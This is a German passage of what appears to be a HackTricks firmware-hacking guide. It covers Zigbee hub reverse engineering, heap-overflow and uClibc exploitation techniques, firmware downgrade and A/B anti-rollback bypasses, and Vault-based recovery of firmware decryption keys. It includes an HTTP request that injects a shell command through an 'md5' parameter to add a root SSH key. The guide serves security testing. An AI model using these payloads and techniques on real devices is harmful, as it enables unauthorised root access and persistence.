Untersuche den persistenten Zustand außerhalb des Guest-Systems, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokolle die Fehlersuche erschweren. Hänge niemals ein Overlay ein, das von einer laufenden VM verwendet wird; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Zur wiederholbaren Fehlerisolierung sollten zeitgestempelte Markerdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und kurzlebige Konsolen können durch Ratenbegrenzung oder vorzeitiges Beenden eines Prozesses falsche Negative liefern. Vergleiche außerdem exakte Schnittstellen über die verschiedenen Ebenen hinweg, bevor du nicht verwandten Code änderst: `uname -r` mit `/lib/modules/`, ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Generation von Mesa-`libGL` mit der DRI-Treiberschnittstelle sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich mit `dlopen()` geladen werden, aber dennoch unbrauchbar bleiben, weil ihr Nutzer eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine reale oder emulierte Geräteumgebung verwendet. Es ist entscheidend, den Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erforscht werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu erkennen.

## Laufzeitanalysetechniken

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dabei kommen Tools wie gdb-multiarch, Frida und Ghidra zum Setzen von Breakpoints sowie zum Erkennen von Schwachstellen durch Fuzzing und andere Techniken zum Einsatz.

Für Embedded-Ziele ohne vollständigen Debugger solltest du eine statisch gelinkte Kopie von `gdbserver` auf das Gerät kopieren und eine Remote-Verbindung herstellen:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Prozessor-Nachrichtenmapping

Bei IoT-Hubs ist der RF-Stack oft zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow besteht darin, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Parser auf Controller-Seite** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Ziele fürs Reverse Engineering statt nur eines. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** kommen können und welche vom Controller selbst
- Die genauen **herstellerspezifischen Diskriminatorfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während des **Commissioning**, der Discovery oder der Firmware-/Modell-Download-Phasen erreichbar sind

Bei Zigbee solltest du den Pairing-Verkehr aufzeichnen und prüfen, ob das Zielgerät noch auf den standardmäßigen **Link Key** `ZigBeeAlliance09` setzt. Falls ja, kann das Mitschneiden des Commissioning-Verkehrs den **Network Key** offenlegen. Zigbee 3.0 Install Codes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokollhandler und durch FSM gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung durchlaufen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Analysiere den Command-Dispatcher rückwärts, bis du den **herstellerspezifischen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Fehlerzweige, die schließlich den Zustand zurücksetzen oder vom Angreifer kontrollierte Daten freigeben.
- Bestätige, welche legitimen Protokollabläufe erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen. Gehe nicht davon aus, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, auf echter Hardware (zum Beispiel einem **nRF52840**) ein legitimes Gerät mit einem herstellerspezifischen Stack zu emulieren, damit die korrekten **Endpoints**, **Attribute** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse bei fragmentierten Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurationsdownloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und reserviert Speicher mit `malloc(total_size)`.
2. Spätere Fragmente prüfen lediglich die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
3. Der Kopiervorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die **ursprünglich reservierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Reservierung zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einer größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und dennoch den ursprünglich reservierten Puffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit ausreichend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell- oder Blob-Download-Zustand zu versetzen.

### Durch Protokoll ausgelöste `free()`-Aufrufe

Bei Embedded-Daemons lässt sich Heap-Metadaten-Exploitation oft am einfachsten auslösen, indem man nicht auf eine Bereinigung wartet, sondern gezielt die **Fehlerbehandlung des Protokolls** auslöst:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Fehlerzustände** zu versetzen.
- Überschreite den Retry-Grenzwert, damit der Daemon den Zustand **zurücksetzt** und den beschädigten Puffer freigibt.
- Nutze diesen vorhersehbaren `free()`-Aufruf, um Allokator-Primitiven auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl/uClibc/dlmalloc-ähnlichen** Allokatoren in Embedded Linux, bei denen beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Schreibprimitiv verwandeln können. Ein stabiles Muster besteht darin, ein **Größenfeld** zu beschädigen, um die Allokator-Traversierung in **Fake-Chunks umzuleiten, die im übergelaufenen Puffer platziert wurden**, statt sofort echte Bin-Zeiger zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Exploitation und Proof of Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in niedrigeren Programmiersprachen. Binäre Laufzeitschutzmechanismen sind in Embedded-Systemen selten. Sind sie vorhanden, können jedoch Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Speicherreservierung kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake-Chunk die Prüfungen bestehen (plausible Größe, `fd = 0` und umgebende Chunks, die als „in use“ gelten).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binärdateien unter ASLR:** Ist ASLR aktiviert, die Hauptbinärdatei aber **nicht PIE**, sind die Adressen in `.data/.bss` innerhalb der Binärdatei stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, damit eine Fastbin-Allokation auf einer **Funktionszeigertabelle** landet.
- **Parser-stoppendes NUL:** Beim Parsen von JSON kann ein `\x00` in der Payload das Parsing beenden und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Kette erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Kette, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analysen

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-Geräten (IoT) unterstützen soll. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für Embedded-Sicherheitstests auf Basis von Ubuntu 18.04, mit vorinstallierten Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades) häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader die Signatur nur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu installierenden Images vergleicht, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit weiterhin gültiger Signatur** installieren und so bereits behobene Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres, signiertes Image beschaffen**
   * Lade es vom öffentlichen Download-Portal, CDN oder Support-Angebot des Herstellers herunter.
   * Extrahiere es aus begleitenden Mobile-/Desktop-Anwendungen (z. B. aus `assets/firmware/` in einem Android-APK).
   * Beschaffe es aus Repositories Dritter wie VirusTotal, Internet-Archiven, Foren usw.
2. **Das Image über einen verfügbaren Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Endverbraucher bieten *nicht authentifizierte* HTTP(S)-Endpunkte, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und eine Recovery oder ein Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional das neueste Image zurückflashen oder Updates deaktivieren, um nach Erlangung der Persistenz nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der verwundbaren (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch die Einschleusung beliebiger Befehle möglich ist (hier: SSH-Zugriff als Root über einen Schlüssel). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch da kein Schutz vor Downgrades besteht, ist die Korrektur wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind in der APK/APEX häufig unverschlüsselt unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only anti-rollback bypass in A/B slot designs

Manche Hersteller implementieren zwar einen Anti-Downgrade-**Ratchet**, allerdings nur innerhalb der *Updater*-Logik (zum Beispiel in einer UDS-Routine über CAN, einem Recovery-Befehl oder einem OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, lässt sich der Rollback-Schutz weiterhin umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Ratchet des Images mit einem in persistentem Speicher abgelegten Wert und lehnt ältere signierte Images ab.
- Der Bootloader **liest den Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots lediglich Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generationszähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Firmware-Digest gebunden**, der validiert wurde.

Dadurch entsteht bei Dual-Slot-Systemen eine Primitive nach dem Muster **ein Image validieren / ein anderes Image booten**. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen, signierten Images als nächstes Boot-Ziel festzulegen, und Slot B anschließend vor dem Neustart überschreiben kann, bootet der Bootloader möglicherweise trotzdem das ältere Image, da er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Eine **aktuelle, signierte** Firmware in den passiven Slot laden und die normale Validierungs-/Umschaltroutine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veraltete Boot-State- oder Slot-Auswahllogik missbrauchen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet erzwingt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf bei der Analyse von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einer erfolgreichen Umschaltung nicht aktualisiert werden.
- Eine Routine nach Art von `prepare_passive_slot()`, die anhand veralteter Zustandsdaten einen Slot löscht, statt das **aktuelle festgeschriebene Layout** heranzuziehen.
- Eine Funktion nach Art von `part_write_layout()`, die lediglich einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht** in ROM / Bootloader / Secure-Boot-Stufen.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport zum *Update-Endpunkt* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfung im ROM-Code)?
* Erzwingt der **Bootloader denselben Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind Slot-Aktivierungsmetadaten **an den Digest/die Version der validierten Firmware gebunden**, oder lässt sich ein Slot nach seiner Aktivierung verändern?
* Wird das Gerät nach einem erfolgreichen Slot-Wechsel zu einem Neustart gezwungen, oder sind weitere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionstabelle, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Punkte, ist die Plattform wahrscheinlich für Rollback-Angriffe anfällig.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, eignen sich die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor jedem Brute-Force-Versuch zunächst eine Container-Triage erfolgen:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` deutet in der Regel auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die restlichen Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein deutlicher Hinweis darauf, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort oder einen Session-Schlüssel umschließt.
- Separates PGP-Material in derselben Datei schützt oft nur die Authentizität; man sollte nicht davon ausgehen, dass es der Vertraulichkeitsschutz ist.

Wenn die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** zurückverfolgt werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / die Management-Binärdatei dekompilieren und nachverfolgen, wer den verschlüsselten Blob liest, welcher Helper/API ihn entschlüsselt und welchen logischen Schlüsselnamen er anfordert.
- Im extrahierten Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten suchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte wie Material für private Schlüssel behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es normalerweise einfacher, diese Umgebung nachzubilden, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Keys nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Key exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Key mit genau dem vom KMS verwendeten Padding-/Hash-Paar testen. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene standardmäßige OAEP-Entschlüsselung beweisen **nicht**, dass der Key falsch ist: Viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Wenn der Payload mit `Salted__` beginnt, die OpenSSL-KDF des Herstellers exakt reproduzieren (`EVP_BytesToKey`, bei älteren Geräten oft MD5), bevor versucht wird, die AES-CBC-Verschlüsselung rückgängig zu machen.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **Die operativen Keys des Geräts wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline reproduzieren**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Senior-Level-Kompetenz, Junior-Level-Autonomie](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der umfassende Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in vernachlässigter Hardware ausnutzen – Trail of Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smart-Gerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über dessen Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Schutzmaßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Angriff auf die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debugging und Fehlerbehebung](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht die Wiederherstellung aus dem SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tool zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
